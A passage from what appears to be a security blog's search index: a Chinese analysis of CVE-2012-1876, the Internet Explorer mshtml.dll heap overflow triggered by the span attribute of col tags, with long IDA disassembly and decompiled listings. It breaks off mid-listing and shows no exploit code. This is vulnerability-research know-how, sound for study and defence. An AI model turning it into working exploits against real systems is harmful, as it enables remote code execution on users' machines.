进行格式化控制，避免了本漏洞的产生\nReferenceNVD - CVE-2012-0809CVE - CVE-2012-0809Sudo - Sudo format string vulnerability漏洞战争\n","categories":["Vulnerability Investigation"]},{"title":"CVE-2012-1876 漏洞研究","url":"/2024/10/24/Vulnerability%20Investigation/CVE-2012-1876-%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/","content":"法国安全团队 Vupen 在 Pwn2Own 2012 利用两个 0day 漏洞攻下了 Windows 7 中的 IE9。这两个 0day 漏洞分别为 IE 沙盒 Bypass 漏洞和 IE 堆溢出漏洞，其中后者根据大赛规定被提交给了微软,并随着 MS12-037 公告的发布而被修复。它的成因为 mshtml.dll 中的 CTableLayout::CalculateMinMax 函数在以 col 标签的 span 属性值为循环次数向堆内存中写入数据时,未对 span 进行有效的校验，若 span 值设置不当就会导致堆溢出进而 RCE。\n\nmshtml.dll 是 IE 中的重要组件，负责解析页面中的 HTML 和 CSS。不少知名漏洞都与它有关，关于 IE 主要组件的更多细节可参阅 Internet Explorer Architecture\n\n影响范围：\nIE 版本Microsoft Internet Explorer 6 ~ 9\n操作系统Microsoft Windows XPMicrosoft Windows Server 2003Microsoft Windows VistaMicrosoft Windows 7\n\n\n漏洞分析开启子进程调试与页堆，调试运行 IE 并打开样本后程序因触发 Access Violation 异常而崩溃。崩溃函数为 mshtml.dll 内的 CTableColCalc::AdjustForCol 函数，崩溃点为 mov dword ptr [edi],ecx。对 edi 进行污点分析发现污点源为 esi,同时崩溃函数内未发现 esi 的赋值语句，故应来自于崩溃函数的主调函数。栈回溯发现其主调函数为 CTableLayout::CalculateMinMax 函数。\n使用 IDA 打开 mshtml.dll 并下载符号表，定位到 CTableColCalc::AdjustForCol 函数，其反汇编代码为\n.text:75050A1A.text:75050A1A                               ; =============== S U B R O U T I N E =======================================.text:75050A1A.text:75050A1A                               ; Attributes: bp-based frame.text:75050A1A.text:75050A1A                               ; void __userpurge CTableColCalc::AdjustForCol(_DWORD *@&lt;eax&gt;, _DWORD *@&lt;esi&gt;, const struct CWidthUnitValue *, int, struct CCalcInfo *, int).text:75050A1A                               ?AdjustForCol@CTableColCalc@@QAEXPBVCWidthUnitValue@@HPAVCCalcInfo@@H@Z proc near.text:75050A1A                                                                       ; CODE XREF: CTableLayout::CalculateMinMax(CTableCalcInfo *,int)+1953FD↑p.text:75050A1A.text:75050A1A                               arg_0= dword ptr  8.text:75050A1A                               arg_4= dword ptr  0Ch.text:75050A1A                               arg_8= dword ptr  10h.text:75050A1A.text:75050A1A 8B FF                         mov     edi, edi.text:75050A1C 55                            push    ebp.text:75050A1D 8B EC                         mov     ebp, esp.text:75050A1F 8B 08                         mov     ecx, [eax].text:75050A21 53                            push    ebx.text:75050A22 8B 5D 08                      mov     ebx, [ebp+arg_0].text:75050A25 57                            push    edi.text:75050A26 8B C1                         mov     eax, ecx.text:75050A28 83 E0 0F                      and     eax, 0Fh.text:75050A2B 8D 7E 18                      lea     edi, [esi+18h].text:75050A2E 50                            push    eax.text:75050A2F 89 0F                         mov     [edi], ecx //! Crash Point.text:75050A31 E8 D3 C3 DA FF                call    ?IsScalerUnit@CUnitValue@@SGHW4UNITVALUETYPE@1@@Z ; CUnitValue::IsScalerUnit(CUnitValue::UNITVALUETYPE).text:75050A31.text:75050A36 85 C0                         test    eax, eax.text:75050A38 74 11                         jz      short loc_75050A4B.text:75050A38.text:75050A3A 6A 08                         push    8.text:75050A3C 57                            push    edi.text:75050A3D 8B C3                         mov     eax, ebx.text:75050A3F E8 3D AC BD FF                call    ?SetValue@CUnitValue@@QAEJJW4UNITVALUETYPE@1@@Z ; CUnitValue::SetValue(long,CUnitValue::UNITVALUETYPE).text:75050A3F.text:75050A44 89 5E 04                      mov     [esi+4], ebx.text:75050A47 89 1E                         mov     [esi], ebx.text:75050A49 EB 2A                         jmp     short loc_75050A75.text:75050A49.text:75050A4B                               ; ---------------------------------------------------------------------------.text:75050A4B.text:75050A4B                               loc_75050A4B:                           ; CODE XREF: CTableColCalc::AdjustForCol(CWidthUnitValue const *,int,CCalcInfo *,int)+1E↑j.text:75050A4B 83 7D 10 01                   cmp     [ebp+arg_8], 1.text:75050A4F 74 15                         jz      short loc_75050A66.text:75050A4F.text:75050A51 8B C1                         mov     eax, ecx.text:75050A53 C1 F8 04                      sar     eax, 4.text:75050A56 99                            cdq.text:75050A57 6A 64                         push    64h ; &#x27;d&#x27;.text:75050A59 59                            pop     ecx                             ; this.text:75050A5A F7 F9                         idiv    ecx.text:75050A5C 57                            push    edi                             ; int.text:75050A5D 99                            cdq.text:75050A5E F7 7D 10                      idiv    [ebp+arg_8].text:75050A61 E8 CD 37 F3 FF                call    ?SetPercent@CUnitValue@@QAEXJ@Z ; CUnitValue::SetPercent(long).text:75050A61.text:75050A66.text:75050A66                               loc_75050A66:                           ; CODE XREF: CTableColCalc::AdjustForCol(CWidthUnitValue const *,int,CCalcInfo *,int)+35↑j.text:75050A66 8B 45 0C                      mov     eax, [ebp+arg_4].text:75050A69 C7 06 01 00 00 00             mov     dword ptr [esi], 1.text:75050A6F 8B 40 10                      mov     eax, [eax+10h].text:75050A72 89 46 04                      mov     [esi+4], eax.text:75050A72.text:75050A75.text:75050A75                               loc_75050A75:                           ; CODE XREF: CTableColCalc::AdjustForCol(CWidthUnitValue const *,int,CCalcInfo *,int)+2F↑j.text:75050A75 5F                            pop     edi.text:75050A76 89 5E 08                      mov     [esi+8], ebx.text:75050A79 5B                            pop     ebx.text:75050A7A 5D                            pop     ebp.text:75050A7B C2 0C 00                      retn    0Ch.text:75050A7B.text:75050A7B                               ?AdjustForCol@CTableColCalc@@QAEXPBVCWidthUnitValue@@HPAVCCalcInfo@@H@Z endp.text:75050A7B.text:75050A7B                               ; ---------------------------------------------------------------------------\n\n其反编译代码为\nvoid __userpurge CTableColCalc::AdjustForCol(        _DWORD *a1@&lt;eax&gt;,        _DWORD *a2@&lt;esi&gt;,        const struct CWidthUnitValue *a3,        int a4,        struct CCalcInfo *a5,        int a6)&#123;  int v7; // [esp-4h] [ebp-Ch]  v7 = *a1 &amp; 0xF;  a2[6] = *a1; //! Crash Point  if ( CUnitValue::IsScalerUnit(v7) )  &#123;    CUnitValue::SetValue(a2 + 6, 8);    a2[1] = a3;    *a2 = a3;  &#125;  else  &#123;    if ( a5 != (struct CCalcInfo *)1 )      CUnitValue::SetPercent((CUnitValue *)0x64, (int)(a2 + 6));    *a2 = 1;    a2[1] = *(_DWORD *)(a4 + 16);  &#125;  a2[2] = a3;&#125;\n\n观察 CTableColCalc::AdjustForCol 函数的代码逻辑不难判断出 Crash Point 处触发的 Access Violation 异常其实和这个函数本身没有太大关系，问题发生在崩溃函数得到的参数上。再定位到 CTableLayout::CalculateMinMax 函数，其反汇编代码为\n.text:74D2A078.text:74D2A078                               ; =============== S U B R O U T I N E =======================================.text:74D2A078.text:74D2A078                               ; Attributes: bp-based frame.text:74D2A078.text:74D2A078                               ; void __thiscall CTableLayout::CalculateMinMax(CTableLayout *this, struct CTableCalcInfo *, struct tagSIZE *, int).text:74D2A078                               ?CalculateMinMax@CTableLayout@@QAEXPAVCTableCalcInfo@@H@Z proc near.text:74D2A078                                                                       ; CODE XREF: CTableLayout::CalcSizeVirtual(CCalcInfo *,tagSIZE *,tagSIZE *)-F2696↑p.text:74D2A078                                                                       ; CTableLayout::CalculateLayout(CTableCalcInfo *,CSize *,int,int)+15C↓p.text:74D2A078                                                                       ; CTableLayoutBlock::CalculateLayout(CTableCalcInfo *,CSize *,int,int)+3A4↓p.text:74D2A078.text:74D2A078                               var_94= dword ptr -94h.text:74D2A078                               var_90= dword ptr -90h.text:74D2A078                               var_8C= dword ptr -8Ch.text:74D2A078                               var_88= dword ptr -88h.text:74D2A078                               var_84= dword ptr -84h.text:74D2A078                               var_7C= dword ptr -7Ch.text:74D2A078                               var_78= dword ptr -78h.text:74D2A078                               var_74= dword ptr -74h.text:74D2A078                               var_70= dword ptr -70h.text:74D2A078                               var_6C= dword ptr -6Ch.text:74D2A078                               var_68= dword ptr -68h.text:74D2A078                               var_64= dword ptr -64h.text:74D2A078                               var_60= dword ptr -60h.text:74D2A078                               var_5C= dword ptr -5Ch.text:74D2A078                               var_58= dword ptr -58h.text:74D2A078                               var_54= dword ptr -54h.text:74D2A078                               var_50= dword ptr -50h.text:74D2A078                               var_4C= dword ptr -4Ch.text:74D2A078                               var_48= dword ptr -48h.text:74D2A078                               var_44= dword ptr -44h.text:74D2A078                               var_40= dword ptr -40h.text:74D2A078                               var_3C= dword ptr -3Ch.text:74D2A078                               var_38= dword ptr -38h.text:74D2A078                               var_34= dword ptr -34h.text:74D2A078                               var_30= dword ptr -30h.text:74D2A078                               var_2C= dword ptr -2Ch.text:74D2A078                               var_28= dword ptr -28h.text:74D2A078                               var_24= dword ptr -24h.text:74D2A078                               var_20= dword ptr -20h.text:74D2A078                               var_1C= dword ptr -1Ch.text:74D2A078                               var_18= dword ptr -18h.text:74D2A078                               var_14= dword ptr -14h.text:74D2A078                               var_10= dword ptr -10h.text:74D2A078                               var_C= dword ptr -0Ch.text:74D2A078                               var_8= dword ptr -8.text:74D2A078                               arg_0= dword ptr  8.text:74D2A078                               arg_4= dword ptr  0Ch.text:74D2A078                               arg_8= dword ptr  10h.text:74D2A078.text:74D2A078                               ; FUNCTION CHUNK AT .text:74C2D451 SIZE 0000006D BYTES.text:74D2A078                               ; FUNCTION CHUNK AT .text:74C74ADE SIZE 00000015 BYTES.text:74D2A078                               ; FUNCTION CHUNK AT .text:74C75092 SIZE 00000058 BYTES.text:74D2A078                               ; FUNCTION CHUNK AT .text:74C75404 SIZE 0000000F BYTES.text:74D2A078                               ; FUNCTION CHUNK AT .text:74C75578 SIZE 00000008 BYTES.text:74D2A078                               ; FUNCTION CHUNK AT .text:74C81C6F SIZE 0000000B BYTES.text:74D2A078                               ; FUNCTION CHUNK AT .text:74C82115 SIZE 0000000E BYTES.text:74D2A078                               ; FUNCTION CHUNK AT .text:74C82AE0 SIZE 0000018F BYTES.text:74D2A078                               ; FUNCTION CHUNK AT .text:74D02AE1 SIZE 0000000D BYTES.text:74D2A078                               ; FUNCTION CHUNK AT .text:74D2B8C6 SIZE 0000001D BYTES.text:74D2A078                               ; FUNCTION CHUNK AT .text:74D2BA60 SIZE 0000020F BYTES.text:74D2A078                               ; FUNCTION CHUNK AT .text:74D31F0E SIZE 0000000E BYTES.text:74D2A078                               ; FUNCTION CHUNK AT .text:74EBF1D0 SIZE 000006AB BYTES.text:74D2A078.text:74D2A078 8B FF                         mov     edi, edi.text:74D2A07A 55                            push    ebp.text:74D2A07B 8B EC                         mov     ebp, esp.text:74D2A07D 81 EC 98 00 00 00             sub     esp, 98h.text:74D2A083 53                            push    ebx                             ; struct tagSIZE *.text:74D2A084 8B 5D 08                      mov     ebx, [ebp+arg_0].text:74D2A087 56                            push    esi                             ; struct CTableCalcInfo *.text:74D2A088 8B 75 0C                      mov     esi, [ebp+arg_4].text:74D2A08B 8B 46 28                      mov     eax, [esi+28h].text:74D2A08E 89 85 70 FF FF FF             mov     [ebp+var_90], eax.text:74D2A094 8B 43 54                      mov     eax, [ebx+54h].text:74D2A097 89 45 08                      mov     [ebp+arg_0], eax.text:74D2A09A 8B 83 28 01 00 00             mov     eax, [ebx+128h].text:74D2A0A0 C1 E8 02                      shr     eax, 2.text:74D2A0A3 89 45 B8                      mov     [ebp+var_48], eax.text:74D2A0A6 57                            push    edi                             ; void *.text:74D2A0A7 33 FF                         xor     edi, edi.text:74D2A0A9 8D 45 94                      lea     eax, [ebp+var_6C].text:74D2A0AC 50                            push    eax.text:74D2A0AD 8B C3                         mov     eax, ebx.text:74D2A0AF 89 7D D8                      mov     [ebp+var_28], edi.text:74D2A0B2 89 7D DC                      mov     [ebp+var_24], edi.text:74D2A0B5 89 7D F8                      mov     [ebp+var_8], edi.text:74D2A0B8 89 7D CC                      mov     [ebp+var_34], edi.text:74D2A0BB E8 08 0D 00 00                call    ?GetSpecifiedPixelWidth@CTableLayout@@QAEJPAVCTableCalcInfo@@PAH@Z ; CTableLayout::GetSpecifiedPixelWidth(CTableCalcInfo *,int *).text:74D2A0BB.text:74D2A0C0 89 45 B4                      mov     [ebp+var_4C], eax.text:74D2A0C3 33 C0                         xor     eax, eax.text:74D2A0C5 89 7D D4                      mov     [ebp+var_2C], edi.text:74D2A0C8 8D BD 78 FF FF FF             lea     edi, [ebp+var_88].text:74D2A0CE AB                            stosd.text:74D2A0CF AB                            stosd.text:74D2A0D0 AB                            stosd.text:74D2A0D1 AB                            stosd.text:74D2A0D2 8B 43 08                      mov     eax, [ebx+8].text:74D2A0D5 89 45 A8                      mov     [ebp+var_58], eax.text:74D2A0D8 8B 43 44                      mov     eax, [ebx+44h].text:74D2A0DB C1 E8 09                      shr     eax, 9.text:74D2A0DE 83 E0 01                      and     eax, 1.text:74D2A0E1 83 7D 08 00                   cmp     [ebp+arg_0], 0.text:74D2A0E5 C7 85 78 FF FF FF 94 A5 C2 74 mov     [ebp+var_88], offset ??_7CAryAutomationRules@CStyleSheet@@6B@ ; const CStyleSheet::CAryAutomationRules::`vftable&#x27;.text:74D2A0EF 89 45 C8                      mov     [ebp+var_38], eax.text:74D2A0F2 0F 84 D8 50 19 00             jz      loc_74EBF1D0.text:74D2A0F2.text:74D2A0F8 8B 45 08                      mov     eax, [ebp+arg_0].text:74D2A0FB 8D 0C 00                      lea     ecx, [eax+eax].text:74D2A0FE B8 FF FF FF 7F                mov     eax, 7FFFFFFFh.text:74D2A103 99                            cdq.text:74D2A104 F7 F9                         idiv    ecx.text:74D2A106 89 45 90                      mov     [ebp+var_70], eax.text:74D2A106.text:74D2A109.text:74D2A109                               loc_74D2A109:                           ; CODE XREF: CTableLayout::CalculateMinMax(CTableCalcInfo *,int)+19515F↓j.text:74D2A109 8B 75 A8                      mov     esi, [ebp+var_58].text:74D2A10C F7 46 1C 00 02 00 00          test    dword ptr [esi+1Ch], 200h.text:74D2A113 74 17                         jz      short loc_74D2A12C.text:74D2A113.text:74D2A115 8B CE                         mov     ecx, esi                        ; this.text:74D2A117 E8 81 DC 0A 00                call    ?GetMarkupPtr@CElement@@QBEPAVCMarkup@@XZ ; CElement::GetMarkupPtr(void).text:74D2A117.text:74D2A11C 81 B8 C0 00 00 00 70 11 01 00 cmp     dword ptr [eax+0C0h], 11170h.text:74D2A126 0F 8D E9 7F F5 FF             jge     loc_74C82115.text:74D2A126.text:74D2A12C.text:74D2A12C                               loc_74D2A12C:                           ; CODE XREF: CTableLayout::CalculateMinMax(CTableCalcInfo *,int)+9B↑j.text:74D2A12C 33 FF                         xor     edi, edi.text:74D2A12E 89 7D A0                      mov     [ebp+var_60], edi.text:74D2A12E.text:74D2A131.text:74D2A131                               loc_74D2A131:                           ; CODE XREF: CTableLayout::CalculateMinMax(CTableCalcInfo *,int)-A7F5A↑j.text:74D2A131 39 7D B4                      cmp     [ebp+var_4C], edi.text:74D2A134 0F 85 35 7B F5 FF             jnz     loc_74C81C6F.text:74D2A134.text:74D2A13A 39 7D 94                      cmp     [ebp+var_6C], edi.text:74D2A13D 0F 85 2C 7B F5 FF             jnz     loc_74C81C6F.text:74D2A13D.text:74D2A143 8B 4E 14                      mov     ecx, [esi+14h]                  ; this.text:74D2A146 E8 CE 10 0F 00                call    ?GetFancyFormat@CTreeNode@@QAEPBVCFancyFormat@@XZ ; CTreeNode::GetFancyFormat(void).text:74D2A146.text:74D2A14B F6 00 20                      test    byte ptr [eax], 20h.text:74D2A14E 0F 85 1B 7B F5 FF             jnz     loc_74C81C6F.text:74D2A14E.text:74D2A154 8B 75 0C                      mov     esi, [ebp+arg_4].text:74D2A157 39 BB 00 01 00 00             cmp     [ebx+100h], edi.text:74D2A15D 0F 85 79 50 19 00             jnz     loc_74EBF1DC.text:74D2A15D.text:74D2A163.text:74D2A163                               loc_74D2A163:                           ; CODE XREF: CTableLayout::CalculateMinMax(CTableCalcInfo *,int)+195170↓j.text:74D2A163                                                                       ; CTableLayout::CalculateMinMax(CTableCalcInfo *,int)+195189↓j.text:74D2A163                                                                       ; CTableLayout::CalculateMinMax(CTableCalcInfo *,int)+195196↓j.text:74D2A163                                                                       ; CTableLayout::CalculateMinMax(CTableCalcInfo *,int)+1951A7↓j.text:74D2A163 33 C0                         xor     eax, eax.text:74D2A165 39 7D B4                      cmp     [ebp+var_4C], edi.text:74D2A168 0F 95 C0                      setnz   al.text:74D2A16B 89 45 94                      mov     [ebp+var_6C], eax.text:74D2A16B.text:74D2A16E.text:74D2A16E                               loc_74D2A16E:                           ; CODE XREF: CTableLayout::CalculateMinMax(CTableCalcInfo *,int)-A8403↑j.text:74D2A16E 56                            push    esi.text:74D2A16F 53                            push    ebx                             ; struct CDocInfo *.text:74D2A170 C7 46 28 03 00 00 00          mov     dword ptr [esi+28h], 3.text:74D2A177 E8 78 F4 FF FF                call    ?CalculateBorderAndSpacing@CTableLayout@@QAEXPAVCDocInfo@@@Z ; CTableLayout::CalculateBorderAndSpacing(CDocInfo *).text:74D2A177.text:74D2A17C 8B 45 A8                      mov     eax, [ebp+var_58].text:74D2A17F 89 7B 58                      mov     [ebx+58h], edi.text:74D2A182 89 7B 60                      mov     [ebx+60h], edi.text:74D2A185 89 7D AC                      mov     [ebp+var_54], edi.text:74D2A188 89 7D B0                      mov     [ebp+var_50], edi.text:74D2A18B 89 BB E0 00 00 00             mov     [ebx+0E0h], edi.text:74D2A191 E8 CB F8 FF FF                call    ?GetAAcols@CTable@@QBEHXZ       ; CTable::GetAAcols(void).text:74D2A191.text:74D2A196 39 45 08                      cmp     [ebp+arg_0], eax.text:74D2A199 8B 4D 08                      mov     ecx, [ebp+arg_0].text:74D2A19C 7C 02                         jl      short loc_74D2A1A0.text:74D2A19C.text:74D2A19E 8B C8                         mov     ecx, eax.text:74D2A19E.text:74D2A1A0.text:74D2A1A0                               loc_74D2A1A0:                           ; CODE XREF: CTableLayout::CalculateMinMax(CTableCalcInfo *,int)+124↑j.text:74D2A1A0 8B 55 08                      mov     edx, [ebp+arg_0].text:74D2A1A3 8B C2                         mov     eax, edx.text:74D2A1A5 2B C1                         sub     eax, ecx.text:74D2A1A7 89 45 E4                      mov     [ebp+var_1C], eax.text:74D2A1AA 6A 00                         push    0.text:74D2A1AC 58                            pop     eax.text:74D2A1AD 0F 94 C0                      setz    al.text:74D2A1B0 89 4B 50                      mov     [ebx+50h], ecx.text:74D2A1B3 C1 E0 08                      shl     eax, 8.text:74D2A1B6 33 43 44                      xor     eax, [ebx+44h].text:74D2A1B9 25 00 01 00 00                and     eax, 100h.text:74D2A1BE 31 43 44                      xor     [ebx+44h], eax.text:74D2A1C1 F6 46 2C 01                   test    byte ptr [esi+2Ch], 1.text:74D2A1C5 0F 85 59 50 19 00             jnz     loc_74EBF224.text:74D2A1C5.text:74D2A1CB.text:74D2A1CB                               loc_74D2A1CB:                           ; CODE XREF: CTableLayout::CalculateMinMax(CTableCalcInfo *,int)+1951AE↓j.text:74D2A1CB 33 C0                         xor     eax, eax.text:74D2A1CB.text:74D2A1CD.text:74D2A1CD                               loc_74D2A1CD:                           ; CODE XREF: CTableLayout::CalculateMinMax(CTableCalcInfo *,int)+1951B7↓j.text:74D2A1CD 09 45 C8                      or      [ebp+var_38], eax.text:74D2A1D0 39 7D 10                      cmp     [ebp+arg_8], edi.text:74D2A1D3 0F 85 5B 50 19 00             jnz     loc_74EBF234.text:74D2A1D3.text:74D2A1D9 8B 83 94 00 00 00             mov     eax, [ebx+94h].text:74D2A1DF C1 E8 02                      shr     eax, 2.text:74D2A1E2 3B C2                         cmp     eax, edx.text:74D2A1E4 7D 39                         jge     short loc_74D2A21F.text:74D2A1E4.text:74D2A1E6 3B D7                         cmp     edx, edi.text:74D2A1E8 8D B3 90 00 00 00             lea     esi, [ebx+90h].text:74D2A1EE 0F 8C 86 32 F0 FF             jl      loc_74C2D47A.text:74D2A1EE.text:74D2A1F4 3B 56 08                      cmp     edx, [esi+8].text:74D2A1F7 76 13                         jbe     short loc_74D2A20C.text:74D2A1F7.text:74D2A1F9 6A 1C                         push    1Ch.text:74D2A1FB 8B C2                         mov     eax, edx.text:74D2A1FD 8B FE                         mov     edi, esi.text:74D2A1FF E8 9A 92 0C 00                call    ?EnsureSizeWorker@CImplAry@@AAEJIJ@Z ; CImplAry::EnsureSizeWorker(uint,long).text:74D2A1FF.text:74D2A204.text:74D2A204                               loc_74D2A204:                           ; CODE XREF: CTableLayout::CalculateMinMax(CTableCalcInfo *,int)-FCBF9↑j.text:74D2A204 85 C0                         test    eax, eax.text:74D2A206 0F 85 AC 02 00 00             jnz     loc_74D2A4B8.text:74D2A206.text:74D2A20C.text:74D2A20C                               loc_74D2A20C:                           ; CODE XREF: CTableLayout::CalculateMinMax(CTableCalcInfo *,int)+17F↑j.text:74D2A20C 8B 46 04                      mov     eax, [esi+4].text:74D2A20F 8B 4D 08                      mov     ecx, [ebp+arg_0].text:74D2A212 83 E0 03                      and     eax, 3.text:74D2A215 C1 E1 02                      shl     ecx, 2                          ; this.text:74D2A218 0B C1                         or      eax, ecx.text:74D2A21A 89 46 04                      mov     [esi+4], eax.text:74D2A21D 33 FF                         xor     edi, edi.text:74D2A21D.text:74D2A21F.text:74D2A21F                               loc_74D2A21F:                           ; CODE XREF: CTableLayout::CalculateMinMax(CTableCalcInfo *,int)+16C↑j.text:74D2A21F 39 7D 08                      cmp     [ebp+arg_0], edi.text:74D2A222 8B B3 9C 00 00 00             mov     esi, [ebx+9Ch].text:74D2A228 89 7D EC                      mov     [ebp+var_14], edi.text:74D2A22B 89 75 D8                      mov     [ebp+var_28], esi.text:74D2A22E 7E 3B                         jle     short loc_74D2A26B.text:74D2A22E.text:74D2A230.text:74D2A230                               loc_74D2A230:                           ; CODE XREF: CTableLayout::CalculateMinMax(CTableCalcInfo *,int)+1EE↓j.text:74D2A230 8D 46 18                      lea     eax, [esi+18h].text:74D2A233 50                            push    eax.text:74D2A234 89 7E 08                      mov     [esi+8], edi.text:74D2A237 89 7E 04                      mov     [esi+4], edi.text:74D2A23A 89 3E                         mov     [esi], edi.text:74D2A23C E8 10 2A 02 00                call    ?SetNull@CUnitValue@@QAEXXZ     ; CUnitValue::SetNull(void).text:74D2A23C.text:74D2A241 8B 4D EC                      mov     ecx, [ebp+var_14]               ; this.text:74D2A244 83 66 14 C1                   and     dword ptr [esi+14h], 0FFFFFFC1h.text:74D2A248 8B C3                         mov     eax, ebx.text:74D2A24A 89 7E 0C                      mov     [esi+0Ch], edi.text:74D2A24D E8 4F F0 01 00                call    ?GetCol@CTableLayout@@QAEPAVCTableCol@@H@Z ; CTableLayout::GetCol(int).text:74D2A24D.text:74D2A252 3B C7                         cmp     eax, edi.text:74D2A254 0F 85 17 50 19 00             jnz     loc_74EBF271.text:74D2A254.text:74D2A25A.text:74D2A25A                               loc_74D2A25A:                           ; CODE XREF: CTableLayout::CalculateMinMax(CTableCalcInfo *,int)+195200↓j.text:74D2A25A                                                                       ; CTableLayout::CalculateMinMax(CTableCalcInfo *,int)+19520A↓j.text:74D2A25A FF 45 EC                      inc     [ebp+var_14].text:74D2A25D 8B 45 EC                      mov     eax, [ebp+var_14].text:74D2A260 83 C6 1C                      add     esi, 1Ch.text:74D2A263 3B 45 08                      cmp     eax, [ebp+arg_0].text:74D2A266 7C C8                         jl      short loc_74D2A230.text:74D2A266.text:74D2A268 89 75 D8                      mov     [ebp+var_28], esi.text:74D2A268.text:74D2A26B.text:74D2A26B                               loc_74D2A26B:                           ; CODE XREF: CTableLayout::CalculateMinMax(CTableCalcInfo *,int)+1B6↑j.text:74D2A26B 8B 43 08                      mov     eax, [ebx+8].text:74D2A26E 39 78 30                      cmp     [eax+30h], edi.text:74D2A271 0F 85 10 50 19 00             jnz     loc_74EBF287.text:74D2A271.text:74D2A277 81 63 44 FF FF DF FF          and     dword ptr [ebx+44h], 0FFDFFFFFh.text:74D2A277.text:74D2A27E.text:74D2A27E                               loc_74D2A27E:                           ; CODE XREF: CTableLayout::CalculateMinMax(CTableCalcInfo *,int)+19523C↓j.text:74D2A27E                                                                       ; CTableLayout::CalculateMinMax(CTableCalcInfo *,int)+19524C↓j.text:74D2A27E F7 43 44 00 20 00 00          test    dword ptr [ebx+44h], 2000h.text:74D2A285 0F 85 55 88 F5 FF             jnz     loc_74C82AE0.text:74D2A285.text:74D2A28B 8B 45 B8                      mov     eax, [ebp+var_48].text:74D2A28E 89 45 E0                      mov     [ebp+var_20], eax.text:74D2A291 8B 83 30 01 00 00             mov     eax, [ebx+130h].text:74D2A297 8B 7D E0                      mov     edi, [ebp+var_20].text:74D2A297.text:74D2A29A.text:74D2A29A                               loc_74D2A29A:                           ; CODE XREF: CTableLayout::CalculateMinMax(CTableCalcInfo *,int)+1951F4↓j.text:74D2A29A 83 BB 00 01 00 00 1A          cmp     dword ptr [ebx+100h], 1Ah.text:74D2A2A1 89 45 EC                      mov     [ebp+var_14], eax.text:74D2A2A4 0F 8F FD 51 19 00             jg      loc_74EBF4A7.text:74D2A2A4.text:74D2A2AA 83 4B 44 20                   or      dword ptr [ebx+44h], 20h.text:74D2A2AE 85 FF                         test    edi, edi.text:74D2A2B0 0F 8E 16 01 00 00             jle     loc_74D2A3CC.text:74D2A2B0.text:74D2A2B6.text:74D2A2B6                               loc_74D2A2B6:                           ; CODE XREF: CTableLayout::CalculateMinMax(CTableCalcInfo *,int)+318↓j.text:74D2A2B6 8B 45 EC                      mov     eax, [ebp+var_14].text:74D2A2B9 8B 00                         mov     eax, [eax].text:74D2A2BB E8 B2 AC 00 00                call    ?RowLayoutCache@CTableRow@@QAEPAVCTableRowLayout@@PAVCLayoutContext@@@Z ; CTableRow::RowLayoutCache(CLayoutContext *).text:74D2A2BB.text:74D2A2C0 89 45 9C                      mov     [ebp+var_64], eax.text:74D2A2C3 85 C0                         test    eax, eax.text:74D2A2C5 0F 84 BA 00 00 00             jz      loc_74D2A385.text:74D2A2C5.text:74D2A2CB 8B F0                         mov     esi, eax.text:74D2A2CD 8B 46 40                      mov     eax, [esi+40h].text:74D2A2D0 C1 E8 02                      shr     eax, 2.text:74D2A2D3 3B 45 08                      cmp     eax, [ebp+arg_0].text:74D2A2D6 0F 8C EA 51 19 00             jl      loc_74EBF4C6.text:74D2A2D6.text:74D2A2DC.text:74D2A2DC                               loc_74D2A2DC:                           ; CODE XREF: CTableLayout::CalculateMinMax(CTableCalcInfo *,int)+195457↓j.text:74D2A2DC 8D 46 50                      lea     eax, [esi+50h].text:74D2A2DF 50                            push    eax.text:74D2A2E0 E8 6C 29 02 00                call    ?SetNull@CUnitValue@@QAEXXZ     ; CUnitValue::SetNull(void).text:74D2A2E0.text:74D2A2E5 8B 46 48                      mov     eax, [esi+48h].text:74D2A2E8 89 45 C0                      mov     [ebp+var_40], eax.text:74D2A2EB 8B 46 08                      mov     eax, [esi+8].text:74D2A2EE 8B 40 14                      mov     eax, [eax+14h].text:74D2A2F1 E8 27 2E 0E 00                call    ?GetCharFormat@CTreeNode@@QAEPBVCCharFormat@@XZ ; CTreeNode::GetCharFormat(void).text:74D2A2F1.text:74D2A2F6 0F B7 00                      movzx   eax, word ptr [eax].text:74D2A2F9 8B 7D EC                      mov     edi, [ebp+var_14].text:74D2A2FC 8B 75 0C                      mov     esi, [ebp+arg_4].text:74D2A2FF C1 E8 05                      shr     eax, 5.text:74D2A302 83 E0 01                      and     eax, 1.text:74D2A305 89 85 6C FF FF FF             mov     [ebp+var_94], eax.text:74D2A30B 8B 07                         mov     eax, [edi].text:74D2A30D 89 86 88 00 00 00             mov     [esi+88h], eax.text:74D2A313 8B 07                         mov     eax, [edi].text:74D2A315 8B 48 14                      mov     ecx, [eax+14h]                  ; this.text:74D2A318 E8 FC 0E 0F 00                call    ?GetFancyFormat@CTreeNode@@QAEPBVCFancyFormat@@XZ ; CTreeNode::GetFancyFormat(void).text:74D2A318.text:74D2A31D FF 76 0C                      push    dword ptr [esi+0Ch]             ; struct CLayoutContext *.text:74D2A320 89 86 90 00 00 00             mov     [esi+90h], eax.text:74D2A326 8B 0F                         mov     ecx, [edi]                      ; this.text:74D2A328 E8 D7 8F 0E 00                call    ?GetUpdatedLayout@CElement@@QAEPAVCLayout@@PAVCLayoutContext@@@Z ; CElement::GetUpdatedLayout(CLayoutContext *).text:74D2A328.text:74D2A32D 89 86 8C 00 00 00             mov     [esi+8Ch], eax.text:74D2A333 8B 45 08                      mov     eax, [ebp+arg_0].text:74D2A336 8B B3 9C 00 00 00             mov     esi, [ebx+9Ch].text:74D2A33C 89 45 F4                      mov     [ebp+var_C], eax.text:74D2A33F 85 C0                         test    eax, eax.text:74D2A33F.text:74D2A341.text:74D2A341                               loc_74D2A341:                           ; CODE XREF: CTableLayout::CalculateMinMax(CTableCalcInfo *,int)+30B↓j.text:74D2A341 89 75 D8                      mov     [ebp+var_28], esi.text:74D2A344 7E 3F                         jle     short loc_74D2A385.text:74D2A344.text:74D2A346 F6 46 14 20                   test    byte ptr [esi+14h], 20h.text:74D2A34A 75 18                         jnz     short loc_74D2A364.text:74D2A34A.text:74D2A34C 8B 45 C0                      mov     eax, [ebp+var_40].text:74D2A34F 8B 08                         mov     ecx, [eax].text:74D2A351 8B C1                         mov     eax, ecx.text:74D2A353 83 E0 FC                      and     eax, 0FFFFFFFCh.text:74D2A356 F7 D1                         not     ecx.text:74D2A358 89 45 A4                      mov     [ebp+var_5C], eax.text:74D2A35B F6 C1 01                      test    cl, 1.text:74D2A35E 0F 85 28 17 00 00             jnz     loc_74D2BA8C.text:74D2A35E.text:74D2A364.text:74D2A364                               loc_74D2A364:                           ; CODE XREF: CTableLayout::CalculateMinMax(CTableCalcInfo *,int)+2D2↑j.text:74D2A364 C7 